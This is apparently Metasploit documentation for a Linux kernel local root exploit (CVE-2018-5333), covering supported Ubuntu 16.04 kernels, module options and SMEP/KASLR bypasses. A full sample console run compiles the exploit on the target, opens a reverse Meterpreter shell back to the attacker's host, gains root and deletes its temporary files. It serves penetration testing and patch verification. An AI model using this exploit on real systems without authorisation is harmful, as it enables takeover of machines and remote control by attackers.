## Description

  This module attempts to gain root privileges on Linux systems by abusing
  a NULL pointer dereference in the `rds_atomic_free_op` function in the
  Reliable Datagram Sockets (RDS) kernel module (rds.ko).

  Successful exploitation requires the RDS kernel module to be loaded.
  If the RDS module is not blacklisted (default); then it will be loaded
  automatically.

  This exploit supports 64-bit Ubuntu Linux systems, including distributions
  based on Ubuntu, such as Linux Mint and Zorin OS.

  Target offsets are available for:

  Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116-generic; and
  Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54-generic.

  This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included.
  Failed exploitation may crash the kernel.


## Vulnerable Application

  This module has been tested successfully on various 4.4 and 4.8 kernels.


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. `use exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc`
  4. `set SESSION <SESSION>`
  5. `check`
  6. `run`
  7. You should get a new *root* session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **WritableDir**

  A writable directory file system path. (default: `/tmp`)

  **COMPILE**

  Options: `Auto` `True` `False` (default: `Auto`)

  Whether the exploit should be live compiled with `gcc` on the target system,
  or uploaded as a pre-compiled binary.

  `Auto` will first determine if `gcc` is installed to compile live on the system,
  and fall back to uploading a pre-compiled executable.


## Scenarios

### Ubuntu 16.04 kernel 4.8.0-51-lowlatency #54~16.04.1-Ubuntu

  ```
  msf5 > use exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc 
  msf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) > set session 1
  session => 1
  msf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) > set verbose true
  verbose => true
  msf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) > check

  [+] System architecture x86_64 is supported
  [+] Linux kernel 4.8.0-51-lowlatency #54~16.04.1-Ubuntu is vulnerable
  [+] SMAP is not enabled
  [+] LKRG is not installed
  [+] grsecurity is not in use
  [+] rds.ko kernel module is loaded
  [*] The target appears to be vulnerable.
  msf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) > set lhost 172.16.191.165
  lhost => 172.16.191.165
  msf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) > run

  [*] Started reverse TCP handler on 172.16.191.165:4444 
  [+] System architecture x86_64 is supported
  [+] Linux kernel 4.8.0-51-lowlatency #54~16.04.1-Ubuntu is vulnerable
  [+] SMAP is not enabled
  [+] LKRG is not installed
  [+] grsecurity is not in use
  [+] rds.ko kernel module is loaded
  [+] gcc is installed
  [*] Live compiling exploit on system...
  [*] Writing '/tmp/.zwl2ezPl' (250 bytes) ...
  [*] Launching exploit (timeout: 30)...
  [*] Transmitting intermediate stager...(126 bytes)
  [*] Sending stage (3021284 bytes) to 172.16.191.206
  [*] Meterpreter session 2 opened (172.16.191.165:4444 -> 172.16.191.206:48130) at 2019-12-21 02:22:40 -0500
  [+] Deleted /tmp/.aCNiWb9vps
  [+] Deleted /tmp/.zwl2ezPl
  [*] Linux RDS rds_atomic_free_op NULL pointer dereference local root (CVE-2018-5333)
  [*] [.] checking kernel version...
  [*] [.] kernel version '4.8.0-51-lowlatency #54~16.04.1-Ubuntu' detected
  [*] [~] done, version looks good
  [*] [.] checking system...
  [*] [~] done, looks good
  [*] [.] mapping null address...
  [*] [~] done, mapped null address
  [*] [.] KASLR bypass enabled, getting kernel base address
  [*] [.] trying /proc/kallsyms...
  [*] [-] kernel base not found in /proc/kallsyms
  [*] [.] trying syslog...
  [*] [.] done, kernel text:   ffffffffa7c00000
  [*] [.] commit_creds:        ffffffffa7ca6ed0
  [*] [.] prepare_kernel_cred: ffffffffa7ca72e0
  [*] [.] mmapping fake stack...
  [*] [~] done, fake stack mmapped
  [*] [.] executing payload 0x4027f7...
  [*] [+] got root

  meterpreter > getuid 
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : 172.16.191.206
  OS           : Ubuntu 16.04 (Linux 4.8.0-51-lowlatency)
  Architecture : x64
  BuildTuple   : x86_64-linux-musl
  Meterpreter  : x64/linux
  meterpreter > 
  ```

